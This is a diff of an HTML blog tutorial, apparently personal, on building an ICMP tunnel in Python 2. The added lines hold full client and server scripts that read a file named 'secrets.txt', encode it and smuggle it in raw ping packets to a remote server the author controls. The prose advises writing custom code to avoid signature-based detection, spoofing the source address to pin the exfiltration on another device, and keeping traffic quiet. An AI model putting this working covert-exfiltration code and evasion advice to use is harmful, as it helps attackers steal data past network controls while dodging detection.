@@ -98,7 +98,9 @@
 			<b>NOTE: I tested this on a Linux (Ubuntu) system using Python 2.7.12, I'd suggest you do 
 			the same. Conversions can be made very easily if you'd like to use another version of Python. If you use a 
 			different OS you may get some errors with the socket creation, however that can be fixed with a quick Google 
-			search (plug in the error number you get and go).</b><br><br>
+			search (plug in the error number you get and go). In addition, I used a Digital Ocean Droplet as my server. If you 
+			perfer another service (such as AWS), ensure that you can successfully ping that server as well as read the ICMP 
+			traffic on the server side.</b><br><br>
 			Ever been in a situation where your outbound network traffic has been blocked? For example at a hotel or coffee shop 
 			wifi access point where they require you to log in to use the internet? These systems can be annoying or intrusive. 
 			What if there was a way to side-step this process and tunnel out of the network? One such way to do this is through 
@@ -116,7 +118,7 @@
 			should be run on systems that you own or have permission to use.</b><br><br>
 			It should be noted that there are many pre-built solutions you can use such a Loki, or 
 			<a style="text-decoration:underline" href="https://github.com/DhavalKapil/icmptunnel">icmptunnel</a>. However 
-			i'd like to show how can this can be done from scratch with relatively little effort. In addition, writing your own 
+			i'd like to show how this can be done from scratch with relatively little effort. In addition, writing your own 
 			code should help prevent being noticed by signature based detection. Alright, let's begin!<br>
 			<h3>ICMP 101: Ping, Request, and Reply</h3>
 			If you have ever made use of ICMP before, it was likely through the "ping" tool on Windows or Linux. Ping allows you 
@@ -128,7 +130,7 @@
 			The first goal of any project is to know what you're trying to build. In this instance we are trying to impersonate 
 			ICMP requests. The easiest way to know what these packets look like is to set up Wireshark to listen to your 
 			network traffic, and then use the "ping" command to ping your machine (localhost). Below I have a screenshot of 
-			what a ICMP packet looks like.
+			what an ICMP packet looks like.
 			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/1.png" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>
 			There it is! A more astute reader may notice that there is no TCP or UDP header in the packet. This is because ICMP 
 			uses a lower level protocol. As a result, this means that when we build our socket we will have to use something called 
@@ -169,12 +171,13 @@ except socket.error, msg:<br>    print 'Error: ' + str(msg[0]) + 'Dont forget to
 			Our next step will be to modify this packet so that we can use it how we want to. There are some things we need to be 
 			aware of. Now, it may be possible for this to work without changing any of the following depending on your setup. I 
 			can't claim to be aware of how every system will react, or how it could be rigged to work this way. All I can say is that 
-			by changing the follow aspects of these packets I was able to communicate with an internet facing server under my control 
+			by changing the following aspects of these packets I was able to communicate with an internet facing server under my control 
 			(more on this in a bit). I would highly encourage you to research and change the following things so that the system will 
 			work. The following is a list of things you will need to modify.<br><br>
 			<ul>
 				<li>Checksum</li>
 				<li>Source Address</li>
+				<li>Destination Address</li>
 			</ul>
 			<h3>Checksum</h3>
 			This is likely the most difficult part of the entire program. I hope you remember bitwise operators and some conversion 
@@ -185,7 +188,12 @@ except socket.error, msg:<br>    print 'Error: ' + str(msg[0]) + 'Dont forget to
 			"08" (which identifies an echo ping request) in the hex string. I would recommend using Wireshark to find this as it 
 			is very useful for learning the layout of a packet.<br><br>
 			I'm sure there are packages out there to help you do this (couldn't find any but I only looked for a second), however I 
-			have some code below that does the work and suites our needs because we take in a hex string. (You may want to look at this in landscape).<br><br>
+			have some code below that does the work and suites our needs because we take in a hex string. (You may want to look at 
+			this in landscape). Notice the variables "part1" and "part2"? Because I was reading the hex string from beginning 
+			to end, the checksum will be represented in Host-Byte-Order. The problem is that because we are planning on 
+			sending this information over a network, we want this to be in Network-Byte-Order. Those variables mentioned 
+			swap the hex values around and give some padding to them. (Before you ask, yes the carry bit is included in 
+			the calculation).<br><br>
 			<pre><code>def checksum(line):<br>    hold = 0<br>    for i in range(0, len(line), 2):<br>        word = ord(line[i]) + (ord(line[i+1]) << 8)<br>        carry = hold + word<br>        hold = (carry & 0xffff) + (carry >> 16)<br>    toReturn = bin(~hold & 0xffff)[2:].zfill(16)<br>    part1 = hex(int(toReturn[:8],2))[2:].zfill(2)<br>    part2 = hex(int(toReturn[8:],2))[2:].zfill(2)<br>    return part2+part1</code></pre><br>
 			As for what part of the hex string we send to the checksum function, lets look at an example. I have provided some 
 			comments to help distinguish some parts of the string. (You may want to look at this in landscape).<br><br>
@@ -203,7 +211,8 @@ except socket.error, msg:<br>    print 'Error: ' + str(msg[0]) + 'Dont forget to
 			Depending on your setup you can change the "source address" field of the packet. I've tested this and it works on my 
 			home network, while still delivering the packets to my controlled server. Why would you do this? In theory you could 
 			spoof an IP, or attempt to pin the exfiltration on another device on the network (although I don't know how well this 
-			could fool someone. I was getting a ton of arp requests when I claimed to be a device that doesn't exist). Because you 
+			could fool someone. I was getting a ton of arp requests when I claimed to be a device that doesn't exist. When I 
+			claimed to be an existing device, I assume the router sent the traffic to that device, I didn't test that.). Because you 
 			are just testing this for fun and education, put your actual IP (not your internet 
 			facing IP, your devices actual network IP. It probably starts with 192 or 10).<br><br>
 			<h3>Server: Digital Ocean</h3>
@@ -213,8 +222,113 @@ except socket.error, msg:<br>    print 'Error: ' + str(msg[0]) + 'Dont forget to
 			real world scenario, as well as prove that it works. To accomplish this goal, I have a Digital Ocean Droplet set up on 
 			a fixed IP address. If you're not familiar with Digital Ocean, its an IaaS provider, similar to AWS. I like it because 
 			it's cheap ($0.007/hour I'm not joking) and it's easy to get up and running (click a button and go). This setup I have 
-			for testing is a Ubuntu 16.04, 64bit system. It's internet facing and I can connect to it over the internet. 
-			
+			for testing is a Ubuntu 16.04, 64bit system. It is internet facing and I can connect to it over the internet.<br><br>
+			First, lets test to make sure that our server can recieve ICMP packets over the internet. To do this, we need some code 
+			to listen for ICMP. This code is below.<br><br>
+			<pre><code>import socket<br>import binascii as b<br>import sys<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>s.bind(('*IP.ADDRESS*',0))<br><br>a = ''<br>while 1:<br>    data, addr = s.recvfrom(1024)<br>    print data</code></pre><br>
+			The only tweak you need to make is to put the correct IP in the bind function. This needs to be the same as the IP of 
+			your server. Now, run this code on your server, you will see a blank prompt. Next, go to your favorite terminal of 
+			choice and ping the IP address of your server. You should see something similar to the following picture.
+			<p style="text-align:center;"><img src="img/icmp-tunneling-basics/3.png" style="max-width:100%;border-width:1px;border-style:solid;border-color:black;"></p>	
+			Notce that sequence of numbers at the end of each line? That's the same sequence of numbers in the junk data 
+			coming from our ping packets! Great, we now know that we are able to communicate with the server. Now that we 
+			have our reciever up and running, lets build our client.
+			<h3>Client</h3>
+			We are almost at the end folks.	Our next job will be creating the actual client that will send data up to our server. 
+			Code for this can be seen below. <b>Be aware: A lot of this can be tweaked however you like. I am setting the length 
+			of data to send to be 16 characters. There is nothing stopping you from changing this.</b><br><br>
+			<pre><code>f = open('secrets.txt', 'r')
+lines = "".join(f.readlines())
+
+for cut in [lines[x:x+16] for x in range(0, len(lines), 16)]:
+    data = cut
+    if len(data) < 16:
+        data = data + ("}"*(16-len(data)))
+
+    stuff = [hex(ord(x))[2:].zfill(2) for x in data]
+    data = "".join(stuff)
+
+    packed = b.unhexlify("0800000055d70001" + data)
+    checkSum = checksum(packed)#        This is local IP--V            V--This is server IP
+    packet = b.unhexlify("450000548d9440004001af12" + "c0a80102" + "8ac54bc5" + "0800" + checkSum + "55d70001" + data)
+    dest = '*SERVER IP*'
+    print checkSum
+    sock.sendto(packet,(dest,0))
+    time.sleep(2)
+</pre></code><br>
+			Now for an explanation. First, we are opening a file we have called "secrets.txt", this is the file we are trying 
+			to transmit across the internet using ICMP. After that, we use a list comprehension to grab 16 characters of data and 
+			convert that to hex before saving it in a veriable called "data". You may notice that I choose to append a bunch of 
+			"}" characters to a line if it is less than 16. I am putting this here as a sort of EOF. There are plenty of more 
+			elegant ways of achieving this, I chose a simple one due to the scope of this article. After this we send our data 
+			to our server. Keep in mind that ICMP is not a stateful protocol, thus you can send packets out of order. There are 
+			solutions to this (such as giving each packet a unique sequential number, or checking the timestamp on each packet) 
+			however, for the purposes of this tutorial, I have simplified this such that we will take a small pause after each 
+			packet sent (that's the "time.sleep(2)"). In addition, it may be a good idea to limit the amount of traffic you are 
+			sending anyways to reduce your "noise".<br><br>
+			<h3>Putting it all Together</h3>
+			We now have everything in place. Let's start tunneling some data. A minor change to our server code, we don't want 
+			to print to a new line every time we recieve something, and we don't want to print out the full packet, just the 
+			data we've placed at the end. To compensate for this, I've sliced off the beginning 26 characters (this stays the same 
+			no matter what), as well as changed the "print" statements to use "sys.stdout.write()".<br><br>
+			<h3>ICMPServer.py</h3>
+			<pre><code>import socket
+import binascii as b
+import sys
+
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+s.bind(('*IP.ADDRESS*',0))
+
+a = ''
+while 1:
+    data, addr = s.recvfrom(1024)
+    sys.stdout.write(data[26:])
+    sys.stdout.flush()</code></pre><br>
+			<h3>ICMPClient.py</h3>
+			<pre><code>import socket
+import binascii as b
+import time
+
+def checksum(line):
+   hold = 0
+   for i in range(0, len(line), 2):
+       word = ord(line[i]) + (ord(line[i+1]) << 8)
+       carry = hold + word
+       hold = (carry & 0xffff) + (carry >> 16)
+   toReturn = bin(~hold & 0xffff)[2:].zfill(16)
+   part1 = hex(int(toReturn[:8],2))[2:].zfill(2)
+   part2 = hex(int(toReturn[8:],2))[2:].zfill(2)
+   return part2+part1
+
+try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+except socket.error, msg:
+    print 'Error: ' + str(msg[0]) + 'Dont forget to sudo'
+    exit()
+
+f = open('secrets.txt', 'r')
+lines = "".join(f.readlines())
+
+for cut in [lines[x:x+16] for x in range(0, len(lines), 16)]:
+    data = cut
+    if len(data) < 16:
+        data = data + ("}"*(16-len(data)))
+
+    stuff = [hex(ord(x))[2:].zfill(2) for x in data]
+    data = "".join(stuff)
+
+    packed = b.unhexlify("0800000055d70001" + data)
+    checkSum = checksum(packed)#        This is local IP--V            V--This is server IP
+    packet = b.unhexlify("450000548d9440004001af12" + "c0a80102" + "8ac54bc5" + "0800" + checkSum + "55d70001" + data)
+    dest = '*SERVER IP*'
+    print checkSum
+    sock.sendto(packet,(dest,0))
+    time.sleep(1)
+
+sock.close()</code></pre><br>
+			With all the code out of the way, it's now time to see the fruits of our labor. Below you can see our tunneling in 
+			action from the server-side perspective.
+
 			
 			
 			
